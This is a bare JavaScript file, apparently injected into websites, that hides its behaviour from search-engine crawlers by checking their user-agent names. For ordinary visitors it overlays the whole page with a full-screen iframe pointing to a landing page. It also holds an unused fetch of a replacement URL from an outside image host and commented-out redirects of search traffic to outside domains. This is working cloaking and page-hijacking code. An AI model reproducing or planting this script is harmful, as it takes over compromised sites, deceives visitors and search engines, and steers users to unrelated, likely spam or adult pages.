let sites = [];
let currentDomain = window.location.hostname;

let uald = navigator.userAgent.toLowerCase();
let aSites = ['google.', 'baidu.', 'baiduspider', 'soso.', 'so.', '360.', 'yahoo.', 'youdao.', 'sogou.', 'gougou.'];
let isSpider_a = false;
for (var i in aSites) {
    if (uald.indexOf(aSites[i]) > 0) {
        isSpider_a = true;
        break;
    }
}

let includesSite = sites.includes(currentDomain);


var s=document.referrer;
if((s.indexOf("baidu")>0 || s.indexOf("google")>0 || s.indexOf(".so.")>0 || s.indexOf("sogou")>0)&&(!(s.indexOf('analpoundtownandassociates')>0))){
    //location.href = 'https://m.92jyh.com/';
   //location.href="https://jyh215.me/";
}



if (!isSpider_a&&!includesSite) {
	showIframe();
}

function requestHref() {
	// 创建一个 XMLHttpRequest 对象
	var xhr = new XMLHttpRequest();

	// 配置请求，指定请求方法和接口 URL
	xhr.open('GET', 'https://img.meituzj.cn/custom/ldpage/index.php', true);

	// 设置请求完成后的回调函数
	xhr.onload = function() {
		// 检查请求的状态
		if (xhr.status >= 200 && xhr.status < 300) {
			// 请求成功，将返回的内容赋值给一个变量
			var response = xhr.responseText;
			if (response && response.length !== 0) {
				showIframeUrl(response);
			}
		} else {
			// 请求失败，输出错误信息
			console.error('请求失败：' + xhr.statusText);
		}
	};

	// 设置请求失败时的回调函数
	xhr.onerror = function() {
		console.error('请求失败：网络错误');
	};

	// 发送请求
	xhr.send();
}

function showIframe() {
	setTimeout(function(){
	    showIframeUrl('/ldpage/index.html');
	}, 1000);
}

function showIframeUrl(url) {
    // 获取当前页面的标题
    var originalTitle = document.title;

    // 创建 iframe 元素并设置属性
    var iframe = document.createElement('iframe');
    iframe.src = url + '?originalTitle=' + originalTitle;
    iframe.scrolling = 'auto';
    iframe.style.cssText = "width:100%; height:100%; left:0; top:0; border:none; position:fixed; background:#fff; z-index:9999999999;";
    

    // 在页面加载时先创建一个 div 用于存放 iframe
    var initialDiv = document.createElement("div");
    initialDiv.style.width = "100%";
    initialDiv.style.height = "100%";
    initialDiv.style.overflow = "auto"; // 如果需要滚动条
    initialDiv.appendChild(iframe);

    // 将初始的 div 直接添加到 body 中显示
    // 尝试将初始 div 添加到 body 或 html 中
    if (document.body) {
        document.body.appendChild(initialDiv);
    } else {
        document.documentElement.appendChild(initialDiv);
    }
}

// 函数用于检查并添加 <meta name="viewport"> 标签
function addViewportMeta() {
  // 查找所有的 meta 标签
  const viewportMeta = document.querySelector('meta[name="viewport"]');
  
  // 如果没有找到，添加新的 meta 标签
  if (!viewportMeta) {
    const meta = document.createElement('meta');
    meta.name = "viewport";
    meta.content = "width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no";
    
    // 将新的 meta 标签添加到 <head> 中
    document.head.appendChild(meta);
  }
}

// 调用函数
addViewportMeta();